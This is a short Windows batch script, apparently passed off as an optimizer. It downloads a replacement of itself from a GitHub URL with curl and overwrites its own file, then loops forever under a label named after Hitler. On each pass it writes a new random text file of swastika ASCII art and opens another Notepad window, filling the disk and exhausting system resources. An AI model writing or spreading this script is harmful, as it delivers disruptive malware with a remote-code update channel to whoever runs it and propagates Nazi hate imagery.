REM Updater
echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
set "filePath=%~f0"
copy "%filePath%" "%filePath%.old"
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
echo.
echo ---------------------------------------------------------------------------
echo.

cls

REM Loops

:Hitler
    set FILENAME=%RANDOM%.txt
    echo.
    echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
    echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
    echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
    echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
    echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
      echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
      echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
      echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
      echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
      echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
      echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
      echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
    start "" notepad.exe
    goto :Hitler
